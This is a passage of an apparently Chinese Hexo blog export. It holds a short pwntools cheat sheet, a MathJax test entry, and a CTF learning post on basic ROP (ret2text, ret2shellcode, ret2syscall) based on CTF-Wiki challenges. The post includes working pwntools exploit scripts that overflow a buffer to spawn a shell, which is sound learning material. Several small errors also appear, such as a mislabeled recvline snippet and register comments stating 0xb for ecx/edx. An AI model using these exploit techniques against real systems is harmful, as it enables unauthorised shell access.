<p>如果我们想将变量 x 发送到 target （目标可以是进程，也可以是 pwntools 建立的远程连接）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">target.send(x)</span><br></pre></td></tr></table></figure>



<p>如果我们想要发送变量 x ，并在其末尾附加一个换行符：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print target.recvline()</span><br></pre></td></tr></table></figure>



<p>如果我们想从 target 打印一行文本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print target.recvline()</span><br></pre></td></tr></table></figure>



<p>如果我们想要打印从 target 到字符串 out 的所有文本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print target.recvuntil("out")</span><br></pre></td></tr></table></figure>





<p>现在还有一件事，ELF 采用最低字节序存储数据，这意味着数据以最低有效字节优先的方式存储。在少数情况下，当我们扫描整数时，我们需要考虑到这一点。幸运的是，pwntools 会为我们处理这个问题。</p>
<p>将整数 y 打包为最小端 QWORD （常用于 x64 ）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p64(x)</span><br></pre></td></tr></table></figure>



<p>将整数 y 打包为最小端 DWORD （常用于 x86 ）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p32(x)</span><br></pre></td></tr></table></figure>



<p>它还可以解包我们获得的值。假设我们想解包一个最低端 QWORD 并获取其整数值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">u64(x)</span><br></pre></td></tr></table></figure>



<p>要解包 DWORD：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">u32(x)</span><br></pre></td></tr></table></figure>



<p>最后，如果只是想直接与 target 交互：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">target.interactive()</span><br></pre></td></tr></table></figure>



<p>更多 pwntools 功能：<a href="https://docs.pwntools.com/en/stable/">https://docs.pwntools.com/en/stable/</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>MathJax Test</title>
    <url>/2020/09/12/%E6%96%B0%E5%BB%BA%20%E6%96%87%E6%9C%AC%E6%96%87%E6%A1%A3/</url>
    <content><![CDATA[<p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -1.602ex;" xmlns="http://www.w3.org/2000/svg" width="25.832ex" height="5.018ex" role="img" focusable="false" viewbox="0 -1509.9 11417.6 2217.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mi" transform="translate(345,0)"><path data-c="210F" d="M182 599Q182 611 174 615T133 619Q118 619 114 621T109 630Q109 636 114 656T122 681Q125 685 202 688Q272 695 286 695Q304 695 304 684Q304 682 295 644T282 597Q282 592 360 592H399Q430 592 445 587T460 563Q460 552 451 541L442 535H266L251 468Q247 453 243 436T236 409T233 399Q233 395 244 404Q295 441 357 441Q405 441 445 417T485 333Q485 284 449 178T412 58T426 44Q447 44 466 68Q485 87 500 130L509 152H531H543Q562 152 562 144Q562 128 546 93T494 23T415 -13Q385 -13 359 3T322 44Q318 52 318 77Q318 99 352 196T386 337Q386 386 346 386Q318 386 286 370Q267 361 245 338T211 292Q207 287 193 235T162 113T138 21Q128 7 122 4Q105 -12 83 -12Q66 -12 54 -2T42 26L166 530Q166 534 161 534T129 535Q127 535 122 535T112 534Q74 534 74 562Q74 570 77 576T84 585T96 589T109 591T124 592T138 592L182 595V599Z"/></g><g data-mml-node="mfrac" transform="translate(907,0)"><g data-mml-node="mi" transform="translate(400.5,676)"><path data-c="1D715" d="M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z"/></g><g data-mml-node="mrow" transform="translate(220,-686)"><g data-mml-node="mi"><path data-c="1D715" d="M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z"/></g><g data-mml-node="mi" transform="translate(566,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"/></g></g><rect width="1127" height="60" x="120" y="220"/></g><g data-mml-node="mi" transform="translate(2274,0)"><path data-c="1D713" d="M161 441Q202 441 226 417T250 358Q250 338 218 252T187 127Q190 85 214 61Q235 43 257 37Q275 29 288 29H289L371 360Q455 691 456 692Q459 694 472 694Q492 694 492 687Q492 678 411 356Q329 28 329 27T335 26Q421 26 498 114T576 278Q576 302 568 319T550 343T532 361T524 384Q524 405 541 424T583 443Q602 443 618 425T634 366Q634 337 623 288T605 220Q573 125 492 57T329 -11H319L296 -104Q272 -198 272 -199Q270 -205 252 -205H239Q233 -199 233 -197Q233 -192 256 -102T279 -9Q272 -8 265 -8Q106 14 106 139Q106 174 139 264T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 299 34 333T82 404T161 441Z"/></g><g data-mml-node="mo" transform="translate(3202.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mo" transform="translate(4258.6,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/></g><g data-mml-node="mfrac" transform="translate(5036.6,0)"><g data-mml-node="msup" transform="translate(384.2,676)"><g data-mml-node="mi"><path data-c="210F" d="M182 599Q182 611 174 615T133 619Q118 619 114 621T109 630Q109 636 114 656T122 681Q125 685 202 688Q272 695 286 695Q304 695 304 684Q304 682 295 644T282 597Q282 592 360 592H399Q430 592 445 587T460 563Q460 552 451 541L442 535H266L251 468Q247 453 243 436T236 409T233 399Q233 395 244 404Q295 441 357 441Q405 441 445 417T485 333Q485 284 449 178T412 58T426 44Q447 44 466 68Q485 87 500 130L509 152H531H543Q562 152 562 144Q562 128 546 93T494 23T415 -13Q385 -13 359 3T322 44Q318 52 318 77Q318 99 352 196T386 337Q386 386 346 386Q318 386 286 370Q267 361 245 338T211 292Q207 287 193 235T162 113T138 21Q128 7 122 4Q105 -12 83 -12Q66 -12 54 -2T42 26L166 530Q166 534 161 534T129 535Q127 535 122 535T112 534Q74 534 74 562Q74 570 77 576T84 585T96 589T109 591T124 592T138 592L182 595V599Z"/></g><g data-mml-node="mn" transform="translate(646.1,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g></g><g data-mml-node="mrow" transform="translate(220,-686)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g><g data-mml-node="mi" transform="translate(500,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g></g><rect width="1578" height="60" x="120" y="220"/></g><g data-mml-node="msup" transform="translate(6854.6,0)"><g data-mml-node="mi"><path data-c="2207" d="M46 676Q46 679 51 683H781Q786 679 786 676Q786 674 617 326T444 -26Q439 -33 416 -33T388 -26Q385 -22 216 326T46 676ZM697 596Q697 597 445 597T193 596Q195 591 319 336T445 80L697 596Z"/></g><g data-mml-node="mn" transform="translate(866,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g></g><g data-mml-node="mi" transform="translate(8124.1,0)"><path data-c="1D713" d="M161 441Q202 441 226 417T250 358Q250 338 218 252T187 127Q190 85 214 61Q235 43 257 37Q275 29 288 29H289L371 360Q455 691 456 692Q459 694 472 694Q492 694 492 687Q492 678 411 356Q329 28 329 27T335 26Q421 26 498 114T576 278Q576 302 568 319T550 343T532 361T524 384Q524 405 541 424T583 443Q602 443 618 425T634 366Q634 337 623 288T605 220Q573 125 492 57T329 -11H319L296 -104Q272 -198 272 -199Q270 -205 252 -205H239Q233 -199 233 -197Q233 -192 256 -102T279 -9Q272 -8 265 -8Q106 14 106 139Q106 174 139 264T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 299 34 333T82 404T161 441Z"/></g><g data-mml-node="mo" transform="translate(8997.3,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"/></g><g data-mml-node="mi" transform="translate(9997.6,0)"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"/></g><g data-mml-node="mi" transform="translate(10766.6,0)"><path data-c="1D713" d="M161 441Q202 441 226 417T250 358Q250 338 218 252T187 127Q190 85 214 61Q235 43 257 37Q275 29 288 29H289L371 360Q455 691 456 692Q459 694 472 694Q492 694 492 687Q492 678 411 356Q329 28 329 27T335 26Q421 26 498 114T576 278Q576 302 568 319T550 343T532 361T524 384Q524 405 541 424T583 443Q602 443 618 425T634 366Q634 337 623 288T605 220Q573 125 492 57T329 -11H319L296 -104Q272 -198 272 -199Q270 -205 252 -205H239Q233 -199 233 -197Q233 -192 256 -102T279 -9Q272 -8 265 -8Q106 14 106 139Q106 174 139 264T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 299 34 333T82 404T161 441Z"/></g></g></g></svg></mjx-container></p>
]]></content>
      <categories>
        <category>MathJax</category>
      </categories>
      <tags>
        <tag>MathJax</tag>
      </tags>
  </entry>
  <entry>
    <title>基本 ROP</title>
    <url>/2025/03/29/%E5%9F%BA%E6%9C%AC%20ROP/</url>
    <content><![CDATA[<p>记录</p>
<span id="more"></span>
<p><font style="color:rgba(0, 0, 0, 0.87);">来源：</font><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">CTF-Wiki</a></p>
<p>返回导向编程（Return-Oriented Programming，缩写：ROP）是计算机安全中的一种漏洞利用技术，该技术允</p>
<p>许攻击者在程序启用了安全保护技术（如堆栈不可执行—NX保护）的情况下控制程序执行流，执行恶意代码。</p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><strong><font style="color:rgba(0, 0, 0, 0.87);">使用方法：</font></strong></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">利用栈溢出控制程序中函数的返回地址，再借助 ROPgadget 寻找程序/libc 中带有ret的指令，利用这些指令构造</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">一个指令序列，从而控制程序的执行。</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">ps:为了方便，后续所有题目我都会命名为“pwn”</font></p>
<h2 id="ret2text"><font style="color:rgba(0, 0, 0, 0.87);">ret2text</font></h2>

<p>以ctf-wiki中的题为例：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p>
<p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">可以看出程序是 32 位程序，且仅开启了栈不可执行保护。接下来我们使用 IDA 反编译该程序：</font></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"There is something amazing here, do you know anything?"</span>);</span><br><span class="line">    gets((<span class="type">char</span> *)&amp;v4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Maybe I will tell you next time !"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞。</p>
<p>同时binary中还有一个后面secure函数，其内调用了system(“/bin/sh”)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">secure</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> input; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  secretcode = rand();</span><br><span class="line">  __isoc99_scanf(&amp;unk_8048760, &amp;input);</span><br><span class="line">  <span class="keyword">if</span> ( input == secretcode )</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>查看反汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:080485FD 55                            push    ebp</span><br><span class="line">.text:080485FE 89 E5                         mov     ebp, esp</span><br><span class="line">.text:08048600 83 EC 28                      sub     esp, 28h</span><br><span class="line">.text:08048603 C7 04 24 00 00 00 00          mov     dword ptr [esp], 0              ; timer</span><br><span class="line">.text:0804860A E8 61 FE FF FF                call    _time</span><br><span class="line">.text:0804860A</span><br><span class="line">.text:0804860F 89 04 24                      mov     [esp], eax                      ; seed</span><br><span class="line">.text:08048612 E8 99 FE FF FF                call    _srand</span><br><span class="line">.text:08048612</span><br><span class="line">.text:08048617 E8 C4 FE FF FF                call    _rand</span><br><span class="line">.text:08048617</span><br><span class="line">.text:0804861C 89 45 F4                      mov     [ebp+secretcode], eax</span><br><span class="line">.text:0804861F 8D 45 F0                      lea     eax, [ebp+input]</span><br><span class="line">.text:08048622 89 44 24 04                   mov     [esp+4], eax</span><br><span class="line">.text:08048626 C7 04 24 60 87 04 08          mov     dword ptr [esp], offset unk_8048760</span><br><span class="line">.text:0804862D E8 BE FE FF FF                call    ___isoc99_scanf</span><br><span class="line">.text:0804862D</span><br><span class="line">.text:08048632 8B 45 F0                      mov     eax, [ebp+input]</span><br><span class="line">.text:08048635 3B 45 F4                      cmp     eax, [ebp+secretcode]</span><br><span class="line">.text:08048638 75 0C                         jnz     short locret_8048646</span><br><span class="line">.text:08048638</span><br><span class="line">.text:0804863A C7 04 24 63 87 04 08          mov     dword ptr [esp], offset command ; "/bin/sh"</span><br><span class="line">.text:08048641 E8 4A FE FF FF                call    _system</span><br></pre></td></tr></table></figure>

<p>那么如果我们直接控制程序返回至 0x0804863A ，那么就可以得到系统的 shell 了。</p>
<p>寻找偏移：</p>
<p>__cdecl 函数调用约定会把形参自右向左依次压入栈中。（参考：<a href="https://www.cnblogs.com/mysky007/p/12913778.html">函数调用约定</a>）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"There is something amazing here, do you know anything?"</span>);</span><br><span class="line">    gets((<span class="type">char</span> *)&amp;v4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Maybe I will tell you next time !"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>一般情况是一个参数，所以相对于ret_addr的偏移量offset=0x64+4，现在有两个形参，所以</p>
<p>offset=0x64+4+4+4</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x64</span>+<span class="number">4</span>+<span class="number">4</span>+<span class="number">4</span></span><br><span class="line">system_addr = <span class="number">0x804863a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'a'</span>*offset + p32(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="ret2syscall"><font style="color:rgba(0, 0, 0, 0.87);">ret2shellcode</font></h2>
ret2shellcode是指当数据段中有可写可执行段时，向该段中写入目标函数代码（通常为system('/bin/sh')）。然后通过栈溢出将返回地址改为该代码的头地址，使之执行。



<p>1、shellcode：</p>
<p>一段能完成某个功能的汇编代码。常见功能是获取目标系统的shell。</p>
<p>2、条件：</p>
<p>由于shellcode需要填充，并且控制程序执行shellcode，故填充的区域需要具有可执行权限。</p>
<p>以ctf-wiki中的题为例：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p>
<p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] '/home/kali/Desktop/pwn'</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>

<p>可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。</p>
<p>IDA打开：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"No system for you this time !!!"</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, s, <span class="number">0x64u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"bye bye ~"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">可以看到，存在栈溢出，不过这次还通过strncpy将对应的字符串复制到 buf2 处（参考：</font><a href="https://www.runoob.com/cprogramming/c-function-strncpy.html">strncpy</a>）</p>
<p><font style="color:rgba(0, 0, 0, 0.87);">同时可以快速知道溢出的相对于ret_addr的偏移量为：offset = 0x64+4 +4+4</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">ret2shellcode在该binary上的应用就是：  </font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">将shellcode通过gets函数输入，通过strncpy函数拷贝到buf2空间存储，然后通过溢出劫持控制流到buf2，执行shellcode。  </font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">那么接下来就是如何寻找buf2的地址，和如何调试查看buf2空间是否具有可执行权限的问题了。  </font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">IDA下的buf2地址查看：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0804A080                               public buf2</span><br><span class="line">.bss:0804A080                               ; char buf2[100]</span><br></pre></td></tr></table></figure>

<p>地址为：0x0804A080</p>
<p><font style="color:rgba(0, 0, 0, 0.87);">这时，我们简单的调试下程序，看看这一个 bss 段是否可执行。</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">依次输入:</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb pwn</span><br><span class="line">b main</span><br><span class="line">r</span><br><span class="line">vmmap</span><br></pre></td></tr></table></figure>

<p>得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">Start      End        Perm      Name</span><br><span class="line">0x08048000 0x08049000 r-xp      /home/kali/Desktop/pwn</span><br><span class="line">0x08049000 0x0804a000 r--p      /home/kali/Desktop/pwn</span><br><span class="line">0x0804a000 0x0804b000 rw-p      /home/kali/Desktop/pwn</span><br><span class="line">0xf7d67000 0xf7d8a000 r--p      /usr/lib/i386-linux-gnu/libc.so.6</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">通过 vmmap，我们可以看到 bss 段对应的段具有可执行权限：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0804a000 0x0804b000 rw-p      /home/kali/Desktop/pwn</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">EXP:</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'i386'</span>      <span class="comment"># 64为程序就改为'amd64'</span></span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x64</span>+<span class="number">4</span>+<span class="number">4</span>+<span class="number">4</span></span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload = shellcode.ljust(offset,<span class="string">b'a'</span>) + p32(buf2_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<h2 id="TTZ92"><font style="color:rgba(0, 0, 0, 0.87);">ret2syscall</font></h2>
<font style="color:rgba(0, 0, 0, 0.87);">ret2syscall，即控制程序执行系统调用，获取 shell。</font>

<p><font style="color:rgba(0, 0, 0, 0.87);">系统调用下的shell：</font></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">execve(<span class="string">"/bin/sh"</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/Nashi_Ko/article/details/120288385">Linux X86架构 32 64系统调用表</a></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">32位binary下的shell：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eax:0xb                    #系统调用号，即 eax 应该为 0xb</span><br><span class="line">ebx:bin_sh_addr            #第一个参数，即 ebx 应该指向 /bin/sh 的地址</span><br><span class="line">ecx:0                      #第二个参数，即 ecx 应该为 0xb</span><br><span class="line">edx:0                      #第三个参数，即 edx 应该为 0xb</span><br><span class="line">int 0x80                   #触发中断</span><br></pre></td></tr></table></figure>



<p><font style="color:rgba(0, 0, 0, 0.87);">payload</font></p>
